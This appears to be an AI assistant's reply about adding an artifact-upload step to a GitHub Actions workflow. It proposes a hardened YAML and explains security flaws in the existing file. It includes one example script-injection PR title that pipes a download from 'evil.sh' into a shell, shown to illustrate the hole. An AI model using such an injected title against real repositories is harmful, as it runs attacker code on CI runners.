I didn't change anything. There are two reasons: the workflow has no build or test steps to attach the upload to, and I don't have a file-editing tool in this session.

**What's in `.github/workflows/deploy.yml` now**

The whole job is two steps: `actions/checkout@v4` and an `echo` of the PR title. Nothing builds anything or runs tests, so there's no artifact to upload and no test step for the upload to follow.

**Proposed change.** You'll need to fill in your real build and test commands and the output path:

```yaml
---
name: deploy

on:
  pull_request:

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - name: Show PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is ${PR_TITLE}"
      - name: Build
        run: make build        # <- your build command
      - name: Test
        run: make test         # <- your test command
      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/          # <- your build output directory
          if-no-files-found: error
          retention-days: 7
```

Steps run in order and the job stops at the first failure, so the upload only runs if the tests pass. You don't need an `if:` condition. `if-no-files-found: error` makes the job fail if the output path is wrong, instead of passing with nothing uploaded.

**Security problems in the existing file.** I fixed these in the proposal too:

- **Script injection on line 14.** `${{ github.event.pull_request.title }}` is pasted straight into the shell script. Anyone who opens a PR controls the title, so a title like ``"; curl evil.sh | sh; #`` runs as code on the runner. The fix is to pass the title through `env:` and quote `"${PR_TITLE}"`.
- **`permissions: write-all` on a `pull_request` trigger.** Uploading an artifact doesn't need write access, so `contents: read` is enough. If a later deploy step needs more, grant just that permission on that job.
- **Credentials left on disk.** `persist-credentials: false` stops checkout from saving the token in `.git/config`, where later steps could read it.

It's also worth pinning `actions/checkout` and `actions/upload-artifact` to full commit SHAs instead of `@v4`.

To finish this, I need your build command, test command and build output path. Once I have those, either apply the YAML above yourself or enable file editing for me and I'll make the change.
